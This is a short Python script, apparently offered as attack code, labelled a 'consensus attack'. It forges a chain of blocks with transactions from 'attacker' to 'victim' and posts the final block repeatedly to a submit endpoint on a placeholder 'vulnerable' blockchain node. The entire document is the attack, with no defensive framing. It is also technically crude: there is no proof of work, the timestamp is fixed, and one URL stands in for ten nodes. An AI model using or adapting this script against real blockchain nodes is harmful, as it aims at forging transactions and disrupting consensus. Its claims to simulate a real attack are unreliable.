import random
import hashlib
import json
import requests

# Configuration
TARGET_API = 'http://vulnerable-blockchain-node.com'
NUM_ATTACK_NODES = 10
FORK_DEPTH = 10
GENESIS_BLOCK = {
    'index': 0,
    'previous_hash': '0',
    'timestamp': '2024-01-01T00:00:00',
    'transactions': [],
    'nonce': 100
}

# Generate a block
def create_block(previous_block, transactions):
    index = previous_block['index'] + 1
    timestamp = '2024-01-01T00:00:00'  # Should be updated dynamically
    nonce = random.randint(0, 1000000)
    block = {
        'index': index,
        'previous_hash': hashlib.sha256(json.dumps(previous_block, sort_keys=True).encode()).hexdigest(),
        'timestamp': timestamp,
        'transactions': transactions,
        'nonce': nonce
    }
    block['hash'] = hashlib.sha256(json.dumps(block, sort_keys=True).encode()).hexdigest()
    return block

# Simulate the attack by creating a forked blockchain
def consensus_attack():
    # Step 1: Initialize the network with a genesis block
    chain = [GENESIS_BLOCK]
    
    # Step 2: Create a forked chain
    for i in range(FORK_DEPTH):
        transactions = [{'sender': 'attacker', 'recipient': 'victim', 'amount': random.randint(1, 100)}]
        new_block = create_block(chain[-1], transactions)
        chain.append(new_block)
    
    # Step 3: Attempt to propagate the forked chain to attack nodes
    for i in range(NUM_ATTACK_NODES):
        response = requests.post(f'{TARGET_API}/submit_block', json=chain[-1])
        if response.status_code == 200:
            print(f"Node {i+1}: Block accepted")
        else:
            print(f"Node {i+1}: Block rejected")

# Run the consensus attack
consensus_attack()
